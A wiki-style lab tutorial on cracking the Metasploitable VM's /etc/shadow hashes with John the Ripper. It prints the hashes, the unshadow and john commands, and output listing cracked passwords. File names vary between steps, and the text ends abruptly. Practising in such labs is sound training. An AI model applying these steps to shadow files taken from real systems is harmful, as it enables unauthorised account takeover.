
Metasploitable/John Shadow File

This page covers how to use John the Ripper to deal with /etc/shadow files.
Contents [hide]

    1 Shadow File
    2 Unshadow the Shadow
    3 Using John to Crack
        3.1 Single Mode
        3.2 Wordlist Mode
    4 Flags

Shadow File

Unix stores information about system usernames and passwords in a file called /etc/shadow. In this file, there are multiple fields (see Reading /etc/shadow page on the wiki for help reading the /etc/shadow file). The most important are the first two: username and password hash.

Example of an /etc/shadow file:

root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::

Only users with a password hash can log in (if there is a * or a !, they cannot log in).
Unshadow the Shadow

To turn an /etc/shadow file into a normal unix password file, use the unshadow utility (from John the Ripper):

umask 077
unshadow r00tpasswd r00tshadow > r00t4john

Now you can run John the Ripper on the file mypasswd.
Using John to Crack
Single Mode

The procedure for using John is to start in single mode:

# john --single r00t4john

Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
msfadmin         (msfadmin)
service          (service)
4g 0:00:00:00 DONE (2016-03-25 22:32) 4.761g/s 8092p/s 8114c/s 8114C/s root1913..root1900
Use the "--show" option to display all of the cracked passwords reliably
Session completed

Bingo! We have already compromised 4 accounts. These 4 accounts each have a password that is the same as the username.
Wordlist Mode

Now run John with a wordlist and tell it to generate rules from the wordlist 500-worst-passwords.txt:

root@morpheus:~# john --wordlist=/usr/share/wordlists/500-worst-passwords.txt --rules r00tmypasswd
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])
Remaining 3 password hashes with 3 different salts
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
batman           (sys)
1g 0:00:00:01 DONE (2016-03-25 22:34) 0.7042g/s 16403p/s 32874c/s 32874C/s Stupiding..Passwording
Use the "--show" option to display all of the cracked passwords reliably
Session completed

Bingo, another account compromised by using a list of the 500 worst passwords imaginable.

We have two left to compromise. Attacking with the wordlist rockyou.txt reveals one more:

root@morpheus:~# john --wordlist=/usr/share/wordlists/rockyou.txt --rules r00tmypasswd
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])
Remaining 2 password hashes with 2 different salts
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789        (klog)

a
